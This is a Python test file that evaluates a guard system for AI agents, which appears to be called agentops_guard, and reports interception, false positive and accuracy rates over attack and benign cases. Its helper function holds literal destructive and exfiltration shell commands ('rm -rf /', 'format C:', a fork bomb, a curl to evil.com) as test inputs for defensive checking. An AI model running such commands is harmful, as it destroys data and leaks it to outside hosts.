"""Evaluation report tests.

Generates and validates the structured evaluation report
with interception rate, false positive rate, and false negative rate.
"""

from __future__ import annotations

from agentops_guard.backend.schemas import PolicyContext, ScanRequest
from agentops_guard.backend.services.policy import evaluate_builtin_policy
from agentops_guard.backend.services.scanner import scan_content
from tests.agent_test.attack_cases import ATTACK_CASES, get_attack_cases, get_benign_cases


def _evaluate_case(case):
    """Run a single case through the full pipeline."""
    scan = scan_content(ScanRequest(content=case.content, source="report_test"))

    tool_info: dict = {}
    if case.tool_name:
        tool_info["name"] = case.tool_name
        if case.tool_name == "shell.execute":
            if case.category == "dangerous_command":
                commands = {
                    "rm_rf_root": "rm -rf /",
                    "format_disk": "format C:",
                    "curl_exfiltrate": "curl https://evil.com/steal",
                    "fork_bomb": ":(){ :|:& };:",
                }
                tool_info["command"] = commands.get(case.name, case.content)
            else:
                tool_info["command"] = "ls -la"

    context = PolicyContext(
        tool=tool_info,
        risk_score=scan.risk_score,
        risk_labels=scan.risk_labels,
        data={"labels": scan.risk_labels},
    )
    decision = evaluate_builtin_policy(context)

    return {
        "case_name": case.name,
        "category": case.category,
        "risk_score": scan.risk_score,
        "risk_labels": scan.risk_labels,
        "action": decision.action,
        "reason_code": decision.reason_code,
        "expected_action": case.expected_action,
    }


class TestEvaluationReport:
    """Generate and validate the evaluation report."""

    def test_generate_full_report(self):
        """Generate a full evaluation report and validate metrics."""
        attacks = get_attack_cases()
        benigns = get_benign_cases()

        attack_results = [_evaluate_case(c) for c in attacks]
        benign_results = [_evaluate_case(c) for c in benigns]

        tp = sum(1 for r in attack_results if r["action"] in ("deny", "quarantine"))
        fn = sum(1 for r in attack_results if r["action"] not in ("deny", "quarantine"))
        tn = sum(1 for r, c in zip(benign_results, benigns) if r["action"] == c.expected_action)
        fp = sum(1 for r, c in zip(benign_results, benigns) if r["action"] != c.expected_action)

        total_attacks = len(attacks)
        total_benign = len(benigns)

        report = {
            "total_cases": total_attacks + total_benign,
            "attack_cases": total_attacks,
            "benign_cases": total_benign,
            "true_positives": tp,
            "false_negatives": fn,
            "true_negatives": tn,
            "false_positives": fp,
            "interception_rate": round(tp / total_attacks * 100, 1) if total_attacks else 0,
            "false_positive_rate": round(fp / total_benign * 100, 1) if total_benign else 0,
            "false_negative_rate": round(fn / total_attacks * 100, 1) if total_attacks else 0,
            "accuracy": round((tp + tn) / (total_attacks + total_benign) * 100, 1),
            "attack_details": attack_results,
            "benign_details": benign_results,
        }

        # Validate report structure
        assert report["total_cases"] == len(ATTACK_CASES)
        assert report["interception_rate"] >= 0
        assert report["false_positive_rate"] >= 0
        assert report["accuracy"] >= 0

        # Print report for CI visibility
        print("\n" + "=" * 60)
        print("AGENT TEST SYSTEM - EVALUATION REPORT")
        print("=" * 60)
        print(f"Total cases:        {report['total_cases']}")
        print(f"Attack cases:       {report['attack_cases']}")
        print(f"Benign cases:       {report['benign_cases']}")
        print(f"True positives:     {report['true_positives']}")
        print(f"False negatives:    {report['false_negatives']}")
        print(f"True negatives:     {report['true_negatives']}")
        print(f"False positives:    {report['false_positives']}")
        print(f"Interception rate:  {report['interception_rate']}%")
        print(f"False positive rate:{report['false_positive_rate']}%")
        print(f"False negative rate:{report['false_negative_rate']}%")
        print(f"Accuracy:           {report['accuracy']}%")
        print("=" * 60)

        # Log failed cases
        for r in report["attack_details"]:
            if r["action"] not in ("deny", "quarantine"):
                print(f"  MISSED: {r['case_name']} ({r['category']}) → {r['action']}")
        for r in report["benign_details"]:
            if r["action"] != "allow":
                print(f"  FALSE POSITIVE: {r['case_name']} → {r['action']}")

    def test_interception_rate_above_threshold(self):
        """Interception rate should be above 50% (regex baseline)."""
        attacks = get_attack_cases()
        results = [_evaluate_case(c) for c in attacks]
        blocked = sum(1 for r in results if r["action"] in ("deny", "quarantine"))
        rate = blocked / len(attacks) if attacks else 0
        assert rate >= 0.5, f"Interception rate {rate:.1%} is below 50% threshold"

    def test_false_positive_rate_below_threshold(self):
        """False positive rate should be below 50% (accounting for high-risk tool approval)."""
        benigns = get_benign_cases()
        results = [_evaluate_case(c) for c in benigns]
        # Count cases where action doesn't match expected
        from tests.agent_test.attack_cases import get_benign_cases as gbc
        benign_cases = gbc()
        false_positives = sum(
            1 for r, c in zip(results, benign_cases) if r["action"] != c.expected_action
        )
        rate = false_positives / len(benigns) if benigns else 0
        assert rate < 0.5, f"False positive rate {rate:.1%} exceeds 50% threshold"
